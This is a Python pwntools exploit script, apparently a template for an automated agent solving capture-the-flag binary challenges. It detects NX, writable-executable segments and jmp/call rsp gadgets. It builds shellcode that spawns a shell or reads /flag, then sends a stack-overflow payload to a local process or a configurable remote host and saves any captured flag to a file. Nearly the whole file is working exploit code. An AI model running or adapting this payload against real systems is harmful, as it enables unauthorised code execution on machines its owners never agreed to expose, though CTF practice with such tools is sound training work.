#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
context.log_level = os.getenv("LOG", "info")

# Bad characters to avoid in shellcode (common defaults, override via env)
BADCHARS = os.getenv("BADCHARS", "\x00\x0a\x0d").encode()

def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


# Check NX status
if elf.nx:
    log.warning("NX is enabled - shellcode on stack may not work")
    log.info("Consider: mprotect shellcode, or ret2libc instead")

# Find executable writable sections for shellcode placement
writable_exec = []
for seg in elf.segments:
    if seg.header.p_flags & 0x1 and seg.header.p_flags & 0x2:  # PF_X and PF_W
        writable_exec.append(seg.header.p_vaddr)
        log.info(f"Found WX segment at {seg.header.p_vaddr:#x}")

# Find suitable jump targets (jmp rsp, call rsp, etc.)
jmp_rsp = None
for gadget in [b"\xff\xe4", b"\xff\xd4", b"\xff\xe5", b"\xff\xd5"]:
    addr = next(elf.search(gadget), None)
    if addr:
        jmp_rsp = addr
        log.info(f"Found jmp/call rsp gadget at {addr:#x}")
        break

# Generate shellcode
shellcode_type = os.getenv("SHELLCODE", "sh")  # sh, readflag, or custom

if shellcode_type == "sh":
    sc = asm(shellcraft.sh())
elif shellcode_type == "readflag":
    # Open-read-write flag
    sc = asm(shellcraft.open(b"/flag") +
             shellcraft.read(3, 'rsp', 0x100) +
             shellcraft.write(1, 'rsp', 0x100))
elif shellcode_type == "cat":
    sc = asm(shellcraft.cat(b"/flag"))
else:
    # Custom shellcode from env
    sc = bytes.fromhex(os.getenv("CUSTOM_SC", ""))

# Verify no bad characters
for i, b in enumerate(sc):
    if bytes([b]) in BADCHARS:
        log.warning(f"Bad char {b:#04x} at offset {i} in shellcode")
        log.info("Use BADCHARS env to customize, or use alternative shellcode")

log.info(f"Shellcode size: {len(sc)} bytes")

io = start()

# Strategy selection based on available gadgets
if jmp_rsp and OFFSET > 0:
    # Stack-based shellcode with jmp rsp
    log.info("Using jmp rsp strategy")
    payload = flat({OFFSET: [jmp_rsp, sc]})
elif OFFSET > 0 and not elf.nx:
    # Direct shellcode on stack after return
    log.info("Using direct stack shellcode")
    # Find a ret gadget for alignment if needed
    ret = next(elf.search(asm('ret')), None)
    if ret:
        payload = flat({OFFSET: [ret, sc]})
    else:
        payload = flat({OFFSET: sc})
elif elf.pie == False:
    # Try to find writable executable section
    if writable_exec:
        log.info(f"Using WX section at {writable_exec[0]:#x}")
        # This needs a write primitive - usually not this simple
        log.warning("WX section strategy requires write primitive - may need manual adjustment")
        payload = flat({OFFSET: [writable_exec[0]]})
    else:
        log.error("No suitable shellcode placement strategy found")
        raise SystemExit("TODO: manual shellcode placement needed")
else:
    log.error("Cannot determine shellcode strategy")
    raise SystemExit("TODO: check protections and find suitable placement")

io.sendline(payload)
emit(io.recvall(timeout=3))
